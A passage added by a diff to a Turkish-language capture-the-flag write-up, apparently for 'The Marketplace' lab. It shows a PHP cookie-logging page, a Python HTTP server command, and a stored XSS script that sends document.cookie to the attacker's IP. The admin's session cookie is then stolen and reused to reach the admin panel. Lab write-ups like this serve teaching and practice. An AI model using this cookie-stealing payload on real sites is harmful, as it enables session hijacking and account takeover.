@@ -149,3 +149,48 @@ Ve adminlerden cevap geldi. İlanımızda siteyi bozan başı şeyler olduğunu 
 
 >şimdi işimize yarayacak kısımda burası. Ben adminin kullanıcı adı ve şifresini bilmiyorum ve kıramadım. O yüzden "pass to cookie" diye adlandırılan yöntemi kullanarak adminin kullanıcı adını şifresini bilmeden adminin hesabını çalacağım. çok ilginç değil mi ? 
 
+şimdi kendimize zaafiyetli bir php sayfası oluşturalım ( yada linkten direk klonlayın [Cookie-stealer](https://github.com/tacticthreat/CookieHeist)
+
+```
+<?php
+$cookie = $_GET['c'];
+$fp = fopen('log.txt', 'a+');
+fwrite($fp, 'Cookie:' .$cookie.'\r\n');
+fclose($fp);
+?>
+```
+
+sonrasında bu php sayfasına diğer makinelerin erişebilmesi için http server olarak yayımlayalım :
+
+```
+python3 -m http.server 8081
+```
+
+Hazırlıklar tamam şimdi siteye zararlı kodumuzu yazalım : 
+
+```
+<script javascript:text>document.location="http://(kendi ip adresinizi yazın):8081/cookiesteal-simple.php?c=" + document.cookie + "&t=Alert"; </script>
+```
+![cookie_track](https://github.com/mel4mi/The-Marketplace-Writeup-TR/blob/main/cookie_track.png)
+
+İlanı yayımladıktan sonra site adminlerinin görmesi için şikayet ediyorum : 
+ biraz bekledikten sonra http server açtığımız terminale dönüyorum ve adminin cookilerini çalındığını görüyorum.
+ 
+ ![cookie_steal](https://github.com/mel4mi/The-Marketplace-Writeup-TR/blob/main/cookie_steal.jpg)
+ 
+ Daha iyi anlamak için cookienin içeriğine bakalım. [Online cookie encode](https://jwt.io/)
+
+![cookie_info](https://github.com/mel4mi/The-Marketplace-Writeup-TR/blob/main/cookie_encode.jpg)
+
+Cookie sahibi michael adında bir admin kullanıcısına ait. O zaman bu cookie ile giriş yapalım.
+
+![cookie_change](https://github.com/mel4mi/The-Marketplace-Writeup-TR/blob/main/Log%20in%20%E2%80%94%20Mozilla%20Firefox%20(kali-linux)%204.09.2022%2017_37_40.png)
+
+Value değerini çaldığımız cookie ile değiştirip sayfayı yenileyin ( f5 ).
+
+Admin panelinde ilk flag'ımızı buluyoruz.
+
+![ilk_flag](https://github.com/mel4mi/The-Marketplace-Writeup-TR/blob/main/ilk_flag.jpg)
+
+ 
+ 
